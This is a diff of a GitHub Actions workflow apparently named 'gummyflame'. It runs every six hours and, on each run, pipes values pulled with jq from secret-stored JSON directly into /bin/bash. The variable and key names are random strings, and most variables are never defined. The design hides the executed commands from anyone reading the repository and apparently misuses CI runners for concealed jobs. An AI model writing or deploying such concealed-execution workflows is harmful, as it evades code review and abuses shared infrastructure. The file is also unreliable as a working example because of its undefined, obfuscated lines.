@@ -1,28 +1,26 @@
 name: gummyflame
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 0/6 * * *'
-jobs:  # 24360
+    - cron: '24 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: gummyflame
         env:
-          heqzn7548: ${{ secrets.heqzn7548 }}
+          es0: ${{ secrets.es0 }}
         run: |
-          echo $heqzn7548 | jq -r .nw31682 | /bin/bash
-          echo $llhl104 | jq -r .qr5005 | /bin/bash
-          echo $gou4239 | jq -r .hwaz091 | /bin/bash
-          echo $iouc8 | jq -r .j52431 | /bin/bash
-          echo $rmiz3 | jq -r .qtf6 | /bin/bash
-          echo $mij67 | jq -r .zcrbj5 | /bin/bash
-          echo $andf0 | jq -r .iejzm3 | /bin/bash
-          echo $uin65 | jq -r .xyq43740 | /bin/bash
-          echo $vhpv207 | jq -r .n40630 | /bin/bash
-          echo $g7116 | jq -r .ho85 | /bin/bash
-          echo $z39216 | jq -r .rxe2739 | /bin/bash
-          echo $um19621 | jq -r .rdbbf921 | /bin/bash
-          echo $kmust1814 | jq -r .gjr65168 | /bin/bash
+          echo $es0 | jq -r .dkaf13897 | /bin/bash
+          echo $ffso8 | jq -r .hicr91 | /bin/bash
+          echo $r84868 | jq -r .mjo13 | /bin/bash
+          echo $lxp5475 | jq -r .vqmai0870 | /bin/bash
+          echo $vbdea325 | jq -r .xolc8212 | /bin/bash
+          echo $tj37724 | jq -r .kfe433 | /bin/bash
+          echo $iznwl2 | jq -r .t05529 | /bin/bash
+          echo $s3609 | jq -r .hq2 | /bin/bash
+          echo $oqht34714 | jq -r .yjxb57 | /bin/bash
 
